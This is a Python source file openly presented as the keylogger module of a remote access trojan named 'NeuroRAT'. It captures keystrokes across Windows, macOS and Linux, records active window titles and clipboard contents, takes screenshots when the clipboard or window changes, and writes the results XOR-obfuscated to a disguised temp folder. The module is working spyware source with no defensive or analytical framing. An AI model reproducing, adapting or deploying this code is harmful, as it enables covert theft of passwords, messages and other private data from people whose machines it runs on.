#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Keylogger Module for NeuroRAT
Author: Mr. Thomas Anderson (iamnobodynothing@gmail.com)
License: MIT

This module creates a stealthy keylogger for capturing user keystrokes.
Features:
- Cross-platform (Windows, macOS, Linux)
- Captures special keys and modifiers
- Window title tracking
- Clipboard monitoring
- Screenshot on clipboard events
- Encrypted data transmission
- Low resource usage
"""

import os
import sys
import time
import json
import base64
import logging
import platform
import threading
import tempfile
from datetime import datetime
from collections import defaultdict

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("NeuroRAT_Keylogger")

# Determine OS type
SYSTEM = platform.system().lower()

try:
    # Try importing platform-specific dependencies
    if SYSTEM == "windows":
        import pythoncom
        import pyWinhook as pyhook
        import win32clipboard
        import win32gui
        import win32con
        from PIL import ImageGrab
    elif SYSTEM == "darwin":  # macOS
        from pynput import keyboard, mouse
        from AppKit import NSWorkspace, NSScreen
        from Quartz import CGWindowListCopyWindowInfo, kCGWindowListOptionOnScreenOnly, kCGNullWindowID
        from PIL import ImageGrab
    else:  # Linux
        from pynput import keyboard, mouse
        from Xlib import display, X
        from PIL import Image
        import io
        import subprocess
except ImportError as e:
    logger.error(f"Failed to import required modules: {e}")
    logger.error("Please install the required dependencies:")
    if SYSTEM == "windows":
        logger.error("pip install pyWinhook pywin32 pillow")
    elif SYSTEM == "darwin":
        logger.error("pip install pynput pyobjc-framework-Quartz pillow")
    else:
        logger.error("pip install pynput xlib pillow")

# Global variables
active_window_title = ""
last_window_title = ""
keystroke_buffer = []
clipboard_data = ""
last_clipboard_data = ""
last_key_time = time.time()
key_count = 0
output_file = None
running = False
screenshot_dir = None
keystroke_count_by_window = defaultdict(int)
mutex = threading.Lock()
max_buffer_size = 1000
check_interval = 0.2  # seconds
max_idle_time = 300  # 5 minutes of inactivity before taking a break
clipboard_check_interval = 2  # seconds to check clipboard

# Encryption helpers (simple XOR for demonstration, use stronger encryption in production)
def encrypt(data, key="NeuroRAT2024"):
    """Simple XOR encryption for data"""
    if not data:
        return data
    
    key_bytes = key.encode() if isinstance(key, str) else key
    data_bytes = data.encode() if isinstance(data, str) else data
    
    result = bytearray(len(data_bytes))
    for i in range(len(data_bytes)):
        result[i] = data_bytes[i] ^ key_bytes[i % len(key_bytes)]
    
    return base64.b64encode(result).decode()

def decrypt(encrypted_data, key="NeuroRAT2024"):
    """Decrypt XOR encrypted data"""
    if not encrypted_data:
        return encrypted_data
    
    data_bytes = base64.b64decode(encrypted_data)
    key_bytes = key.encode() if isinstance(key, str) else key
    
    result = bytearray(len(data_bytes))
    for i in range(len(data_bytes)):
        result[i] = data_bytes[i] ^ key_bytes[i % len(key_bytes)]
    
    return result.decode()

# Platform-specific implementations
class BaseKeylogger:
    """Base keylogger class with common functionality"""
    
    def __init__(self, output_path=None, take_screenshots=True):
        global output_file, screenshot_dir
        
        # Create output directory if it doesn't exist
        if output_path:
            self.output_path = output_path
            os.makedirs(os.path.dirname(output_path), exist_ok=True)
        else:
            logger_dir = os.path.join(tempfile.gettempdir(), "system_logs")
            os.makedirs(logger_dir, exist_ok=True)
            self.output_path = os.path.join(logger_dir, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.dat")
        
        output_file = self.output_path
        
        # Create screenshot directory if needed
        if take_screenshots:
            self.take_screenshots = True
            screenshot_dir = os.path.join(os.path.dirname(self.output_path), "screenshots")
            os.makedirs(screenshot_dir, exist_ok=True)
        else:
            self.take_screenshots = False
            screenshot_dir = None
        
        # Initialize counters and state
        self.start_time = datetime.now()
        self.key_count = 0
        self.window_changes = 0
        self.idle_time = 0
        self.active = False
        
        logger.info(f"Keylogger initialized. Output file: {self.output_path}")
        if self.take_screenshots:
            logger.info(f"Screenshots will be saved to: {screenshot_dir}")
    
    def _save_data(self, data):
        """Save captured data to file, encrypting it first"""
        global keystroke_buffer
        
        try:
            with mutex:
                # Encrypt and write data
                encrypted_data = encrypt(json.dumps(data))
                
                with open(self.output_path, "a", encoding="utf-8") as f:
                    f.write(encrypted_data + "\n")
                
                # Clear buffer after successful write
                keystroke_buffer = []
                
        except Exception as e:
            logger.error(f"Error saving keylogger data: {e}")
    
    def _take_screenshot(self, reason="window_change"):
        """Take a screenshot and save it to file"""
        if not self.take_screenshots or not screenshot_dir:
            return None
        
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{timestamp}_{reason}.png"
            filepath = os.path.join(screenshot_dir, filename)
            
            # Platform-specific screenshot logic
            if SYSTEM == "windows" or SYSTEM == "darwin":
                screenshot = ImageGrab.grab()
                screenshot.save(filepath)
                logger.info(f"Screenshot saved: {filepath}")
                return filepath
            else:  # Linux
                try:
                    # Use xwd command line tool for Linux
                    subprocess.run(["xwd", "-root", "-silent", "-out", filepath], check=True)
                    # Convert to PNG if needed
                    subprocess.run(["convert", filepath, filepath.replace(".xwd", ".png")], check=True)
                    os.remove(filepath)  # Remove the original xwd file
                    filepath = filepath.replace(".xwd", ".png")
                    logger.info(f"Screenshot saved: {filepath}")
                    return filepath
                except Exception as e:
                    logger.error(f"Error taking screenshot on Linux: {e}")
                    return None
        except Exception as e:
            logger.error(f"Error taking screenshot: {e}")
            return None
    
    def _check_clipboard(self):
        """Check clipboard contents and update if changed"""
        global clipboard_data, last_clipboard_data
        
        try:
            new_clipboard_data = self._get_clipboard_data()
            
            if new_clipboard_data and new_clipboard_data != last_clipboard_data:
                clipboard_data = new_clipboard_data
                last_clipboard_data = new_clipboard_data
                
                # Take screenshot when clipboard changes
                if self.take_screenshots:
                    screenshot_path = self._take_screenshot("clipboard")
                
                # Log clipboard content
                data = {
                    "type": "clipboard",
                    "content": clipboard_data,
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "window": active_window_title,
                    "screenshot": screenshot_path if screenshot_path else None
                }
                
                self._save_data(data)
                
        except Exception as e:
            logger.error(f"Error checking clipboard: {e}")
    
    def _get_clipboard_data(self):
        """Platform-specific clipboard access"""
        try:
            if SYSTEM == "windows":
                win32clipboard.OpenClipboard()
                try:
                    if win32clipboard.IsClipboardFormatAvailable(win32con.CF_TEXT):
                        data = win32clipboard.GetClipboardData(win32con.CF_TEXT)
                        return data.decode('utf-8')
                finally:
                    win32clipboard.CloseClipboard()
            elif SYSTEM == "darwin":
                # Use pbpaste on macOS
                process = subprocess.Popen(['pbpaste'], stdout=subprocess.PIPE)
                clipboard_content, _ = process.communicate()
                return clipboard_content.decode('utf-8', errors='ignore')
            else:
                # Use xclip on Linux
                process = subprocess.Popen(['xclip', '-selection', 'clipboard', '-o'], 
                                          stdout=subprocess.PIPE)
                clipboard_content, _ = process.communicate()
                return clipboard_content.decode('utf-8', errors='ignore')
        except Exception as e:
            logger.error(f"Error accessing clipboard: {e}")
        
        return ""
    
    def _update_window_title(self):
        """Update the current active window title"""
        pass  # Implemented in platform-specific subclasses
    
    def start(self):
        """Start the keylogger"""
        global running
        
        if running:
            logger.warning("Keylogger is already running.")
            return False
        
        try:
            running = True
            self.active = True
            
            # Start auxiliary threads
            self._start_auxiliary_threads()
            
            # Log keylogger start
            self._save_data({
                "type": "status",
                "status": "started",
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "platform": platform.platform(),
                "username": os.getlogin()
            })
            
            logger.info("Keylogger started successfully.")
            return True
        except Exception as e:
            logger.error(f"Error starting keylogger: {e}")
            running = False
            return False
    
    def _start_auxiliary_threads(self):
        """Start auxiliary threads for window title, clipboard monitoring, etc."""
        # Thread for periodic tasks (window title updates, clipboard checks)
        self.periodic_thread = threading.Thread(target=self._periodic_check, daemon=True)
        self.periodic_thread.start()
    
    def _periodic_check(self):
        """Periodic checks for various monitoring tasks"""
        global active_window_title, last_window_title
        
        while running and self.active:
            try:
                # Update window title
                self._update_window_title()
                
                # Check if window has changed
                if active_window_title != last_window_title:
                    # Log window change
                    data = {
                        "type": "window_change",
                        "window": active_window_title,
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    }
                    
                    # Take screenshot on window change
                    if self.take_screenshots:
                        screenshot_path = self._take_screenshot("window_change")
                        if screenshot_path:
                            data["screenshot"] = screenshot_path
                    
                    self._save_data(data)
                    last_window_title = active_window_title
                    self.window_changes += 1
                
                # Check clipboard
                self._check_clipboard()
                
                # Check idle time
                current_time = time.time()
                if current_time - last_key_time > max_idle_time:
                    self.idle_time += check_interval
                else:
                    self.idle_time = 0
                
                # Sleep to avoid high CPU usage
                time.sleep(check_interval)
                
            except Exception as e:
                logger.error(f"Error in periodic check: {e}")
                time.sleep(check_interval)
    
    def stop(self):
        """Stop the keylogger"""
        global running
        
        if not running:
            return False
        
        try:
            # Log keylogger stop
            self._save_data({
                "type": "status",
                "status": "stopped",
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "stats": {
                    "duration": str(datetime.now() - self.start_time),
                    "keys_logged": self.key_count,
                    "window_changes": self.window_changes
                }
            })
            
            running = False
            self.active = False
            
            logger.info(f"Keylogger stopped. Logged {self.key_count} keystrokes over {self.window_changes} window changes.")
            return True
        except Exception as e:
            logger.error(f"Error stopping keylogger: {e}")
            return False
    
    def _log_keystroke(self, key, key_type="key"):
        """Log a keystroke to the buffer"""
        global keystroke_buffer, key_count, last_key_time, active_window_title
        
        try:
            with mutex:
                # Update counters
                key_count += 1
                self.key_count += 1
                last_key_time = time.time()
                keystroke_count_by_window[active_window_title] += 1
                
                # Add keystroke to buffer
                keystroke_buffer.append({
                    "key": key,
                    "type": key_type,
                    "window": active_window_title,
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
                })
                
                # Save if buffer is full
                if len(keystroke_buffer) >= max_buffer_size:
                    data = {
                        "type": "keystrokes",
                        "keys": keystroke_buffer,
                        "window": active_window_title,
                        "count": len(keystroke_buffer)
                    }
                    self._save_data(data)
        except Exception as e:
            logger.error(f"Error logging keystroke: {e}")


class WindowsKeylogger(BaseKeylogger):
    """Windows-specific keylogger implementation using pyWinhook"""
    
    def __init__(self, output_path=None, take_screenshots=True):
        super().__init__(output_path, take_screenshots)
        self.hook_manager = None
    
    def _update_window_title(self):
        """Update active window title on Windows"""
        global active_window_title
        
        try:
            hwnd = win32gui.GetForegroundWindow()
            active_window_title = win32gui.GetWindowText(hwnd)
        except Exception as e:
            logger.error(f"Error getting active window title: {e}")
    
    def _key_event(self, event):
        """Handle key events on Windows"""
        try:
            # Get key details
            key_name = event.Key
            
            # Check for special keys
            if key_name in ['Lshift', 'Rshift', 'Lcontrol', 'Rcontrol', 'Lmenu', 'Rmenu', 'Lwin', 'Rwin']:
                key_type = "modifier"
            elif key_name in ['Return', 'Space', 'Back', 'Tab']:
                key_type = "special"
            else:
                key_type = "key"
            
            # Log the keystroke
            self._log_keystroke(key_name, key_type)
            
        except Exception as e:
            logger.error(f"Error handling key event: {e}")
        
        # Return True to pass event to other handlers
        return True
    
    def start(self):
        """Start Windows keylogger with hooks"""
        if not super().start():
            return False
        
        try:
            # Initialize hook manager
            self.hook_manager = pyhook.HookManager()
            
            # Set up keyboard hook
            self.hook_manager.KeyDown = self._key_event
            self.hook_manager.HookKeyboard()
            
            # Initialize and start message loop
            pythoncom.PumpMessages()
            
            return True
        except Exception as e:
            logger.error(f"Error starting Windows keylogger: {e}")
            self.stop()
            return False
    
    def stop(self):
        """Stop Windows keylogger"""
        if super().stop():
            if self.hook_manager:
                try:
                    self.hook_manager.UnhookKeyboard()
                except:
                    pass
            return True
        return False


class MacKeylogger(BaseKeylogger):
    """macOS-specific keylogger implementation using pynput"""
    
    def __init__(self, output_path=None, take_screenshots=True):
        super().__init__(output_path, take_screenshots)
        self.keyboard_listener = None
        
    def _on_press(self, key):
        """Handle key press events on macOS"""
        try:
            # Process key
            if hasattr(key, 'char') and key.char:
                key_name = key.char
                key_type = "key"
            else:
                # Handle special keys
                key_name = str(key).replace('Key.', '')
                if key_name in ['shift', 'shift_r', 'ctrl', 'ctrl_r', 'alt', 'alt_r', 'cmd', 'cmd_r']:
                    key_type = "modifier"
                else:
                    key_type = "special"
            
            # Log the keystroke
            self._log_keystroke(key_name, key_type)
            
        except Exception as e:
            logger.error(f"Error handling key press: {e}")
    
    def _update_window_title(self):
        """Update active window title on macOS"""
        global active_window_title
        
        try:
            # Get active app
            active_app = NSWorkspace.sharedWorkspace().frontmostApplication()
            app_name = active_app.localizedName()
            
            # Get window title (if available)
            window_info = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly, kCGNullWindowID)
            for window in window_info:
                if window['kCGWindowOwnerName'] == app_name:
                    window_title = window.get('kCGWindowName', '')
                    if window_title:
                        active_window_title = f"{app_name} - {window_title}"
                        return
            
            # Fallback to app name
            active_window_title = app_name
        except Exception as e:
            logger.error(f"Error getting active window title: {e}")
    
    def start(self):
        """Start macOS keylogger with listeners"""
        if not super().start():
            return False
        
        try:
            # Set up keyboard listener
            self.keyboard_listener = keyboard.Listener(on_press=self._on_press)
            self.keyboard_listener.start()
            
            return True
        except Exception as e:
            logger.error(f"Error starting macOS keylogger: {e}")
            self.stop()
            return False
    
    def stop(self):
        """Stop macOS keylogger"""
        if super().stop():
            if self.keyboard_listener:
                try:
                    self.keyboard_listener.stop()
                except:
                    pass
            return True
        return False


class LinuxKeylogger(BaseKeylogger):
    """Linux-specific keylogger implementation using pynput and Xlib"""
    
    def __init__(self, output_path=None, take_screenshots=True):
        super().__init__(output_path, take_screenshots)
        self.keyboard_listener = None
        self.display = None
        
        # Initialize X11 display
        try:
            self.display = display.Display()
        except Exception as e:
            logger.error(f"Error initializing X display: {e}")
    
    def _on_press(self, key):
        """Handle key press events on Linux"""
        try:
            # Process key
            if hasattr(key, 'char') and key.char:
                key_name = key.char
                key_type = "key"
            else:
                # Handle special keys
                key_name = str(key).replace('Key.', '')
                if key_name in ['shift', 'shift_r', 'ctrl', 'ctrl_r', 'alt', 'alt_r', 'cmd', 'cmd_r']:
                    key_type = "modifier"
                else:
                    key_type = "special"
            
            # Log the keystroke
            self._log_keystroke(key_name, key_type)
            
        except Exception as e:
            logger.error(f"Error handling key press: {e}")
    
    def _update_window_title(self):
        """Update active window title on Linux using Xlib"""
        global active_window_title
        
        if not self.display:
            return
        
        try:
            root = self.display.screen().root
            window_id = root.get_full_property(self.display.intern_atom('_NET_ACTIVE_WINDOW'), X.AnyPropertyType).value[0]
            
            window = self.display.create_resource_object('window', window_id)
            window_name = window.get_full_property(self.display.intern_atom('_NET_WM_NAME'), X.AnyPropertyType)
            
            # Use window name if available
            if window_name:
                active_window_title = window_name.value.decode('utf-8')
            else:
                # Fallback to class hint
                class_hint = window.get_wm_class()
                if class_hint:
                    active_window_title = class_hint[1]
                else:
                    active_window_title = "Unknown Window"
        except Exception as e:
            # Don't log errors for every attempt, as some windows might not support all properties
            pass
    
    def start(self):
        """Start Linux keylogger with listeners"""
        if not super().start():
            return False
        
        try:
            # Set up keyboard listener
            self.keyboard_listener = keyboard.Listener(on_press=self._on_press)
            self.keyboard_listener.start()
            
            return True
        except Exception as e:
            logger.error(f"Error starting Linux keylogger: {e}")
            self.stop()
            return False
    
    def stop(self):
        """Stop Linux keylogger"""
        if super().stop():
            if self.keyboard_listener:
                try:
                    self.keyboard_listener.stop()
                except:
                    pass
            return True
        return False


def create_keylogger(output_path=None, take_screenshots=True):
    """Create appropriate keylogger for current platform"""
    system = platform.system().lower()
    
    if system == "windows":
        return WindowsKeylogger(output_path, take_screenshots)
    elif system == "darwin":
        return MacKeylogger(output_path, take_screenshots)
    elif system == "linux":
        return LinuxKeylogger(output_path, take_screenshots)
    else:
        logger.error(f"Unsupported platform: {system}")
        return None


def start_keylogger(output_path=None, take_screenshots=True):
    """Start keylogger in the background and return control"""
    try:
        # Create keylogger for current platform
        keylogger = create_keylogger(output_path, take_screenshots)
        
        if not keylogger:
            return {"success": False, "error": "Failed to create keylogger for current platform"}
        
        # Start keylogger in a separate thread
        thread = threading.Thread(target=keylogger.start, daemon=True)
        thread.start()
        
        # Wait a moment to ensure it starts
        time.sleep(2)
        
        if running:
            return {
                "success": True, 
                "output_file": keylogger.output_path,
                "keylogger": keylogger,
                "screenshots_dir": screenshot_dir if take_screenshots else None
            }
        else:
            return {"success": False, "error": "Failed to start keylogger"}
        
    except Exception as e:
        logger.error(f"Error starting keylogger: {e}")
        return {"success": False, "error": str(e)}


def stop_keylogger(keylogger):
    """Stop a running keylogger"""
    if keylogger:
        keylogger.stop()
        return {"success": True}
    return {"success": False, "error": "No keylogger provided"}


def read_keylogger_data(data_file):
    """Read and decrypt keylogger data from file"""
    if not os.path.exists(data_file):
        return {"success": False, "error": "Data file does not exist"}
    
    try:
        entries = []
        with open(data_file, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line:
                    try:
                        decrypted = decrypt(line)
                        entry = json.loads(decrypted)
                        entries.append(entry)
                    except Exception as e:
                        logger.error(f"Error decrypting entry: {e}")
        
        return {"success": True, "entries": entries, "count": len(entries)}
    except Exception as e:
        logger.error(f"Error reading keylogger data: {e}")
        return {"success": False, "error": str(e)}


if __name__ == "__main__":
    # If run directly, start keylogger with default settings
    result = start_keylogger()
    
    if result["success"]:
        logger.info(f"Keylogger started successfully. Output file: {result['output_file']}")
        
        try:
            # Keep running until interrupted
            while True:
                time.sleep(60)
        except KeyboardInterrupt:
            # Stop keylogger on Ctrl+C
            stop_keylogger(result["keylogger"])
            logger.info("Keylogger stopped.")
    else:
        logger.error(f"Failed to start keylogger: {result.get('error', 'Unknown error')}") 